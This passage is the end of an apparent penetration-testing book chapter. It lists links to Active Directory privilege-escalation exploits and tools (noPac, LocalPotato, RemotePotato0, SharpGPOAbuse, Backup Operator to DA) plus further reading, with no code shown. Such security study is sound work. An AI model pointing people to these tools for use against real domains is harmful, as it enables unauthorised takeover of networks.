<li>Linux version noPac <span class="No-Break">exploit: </span><a href="https://github.com/WazeHell/sam-the-admin"><span class="No-Break">https://github.com/WazeHell/sam-the-admin</span></a></li>
<li>Local <span class="No-Break">potato: </span><a href="https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/"><span class="No-Break">https://decoder.cloud/2023/02/13/localpotato-when-swapping-the-context-leads-you-to-system/</span></a></li>
<li>Remote <span class="No-Break">Potato0: </span><a href="https://github.com/antonioCoco/RemotePotato0"><span class="No-Break">https://github.com/antonioCoco/RemotePotato0</span></a></li>
<li>ACL mind <span class="No-Break">map: </span><a href="https://www.thehacker.recipes/ad/movement/dacl"><span class="No-Break">https://www.thehacker.recipes/ad/movement/dacl</span></a></li>
<li>SharpGPOAbuse <span class="No-Break">tool: </span><a href="https://github.com/FsecureLABS/SharpGPOAbuse"><span class="No-Break">https://github.com/FsecureLABS/SharpGPOAbuse</span></a></li>
<li>Print Operator privilege <span class="No-Break">escalation: </span><a href="https://neutronsec.com/privesc/windows/print_operators/"><span class="No-Break">https://neutronsec.com/privesc/windows/print_operators/</span></a></li>
<li>Backup Operator to DA <span class="No-Break">exploit: </span><a href="https://github.com/mpgn/BackupOperatorToDA"><span class="No-Break">https://github.com/mpgn/BackupOperatorToDA</span></a></li>
</ol>
<h1 id="_idParaDest-132"><a id="_idTextAnchor145"/>Further reading</h1>
<p>These aids for further study will let you dive deeper into the attacks covered in <span class="No-Break">the chapter:</span></p>
<ul>
<li>I highly encourage you to read this blog post, as it has great insights into how the Remote Potato attack path was discovered and the general way of research <span class="No-Break">thinking: </span><a href="https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/"><span class="No-Break">https://www.sentinelone.com/labs/relaying-potatoes-another-unexpected-privilege-escalation-vulnerability-in-windows-rpc-protocol/</span></a><span class="No-Break">.</span></li>
<li>A good demonstration of the Remote Potato exploit in <span class="No-Break">action: </span><a href="https://pentestlab.blog/2021/05/04/remote-potato-from-domain-user-to-enterprise-admin/"><span class="No-Break">https://pentestlab.blog/2021/05/04/remote-potato-from-domain-user-to-enterprise-admin/</span></a></li>
<li>Microsoft documentation about Group Policy <span class="No-Break">structure: </span><a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpod/260b58dc-da14-400b-8b82-6abbfd529fbf"><span class="No-Break">https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpod/260b58dc-da14-400b-8b82-6abbfd529fbf</span></a></li>
<li>Microsoft PowerShell GP-Link command <span class="No-Break">reference: </span><a href="https://learn.microsoft.com/en-us/powershell/module/grouppolicy/new-gplink?view=windowsserver2022-ps"><span class="No-Break">https://learn.microsoft.com/en-us/powershell/module/grouppolicy/new-gplink?view=windowsserver2022-ps</span></a></li>
</ul>
</div>
</div></body></html>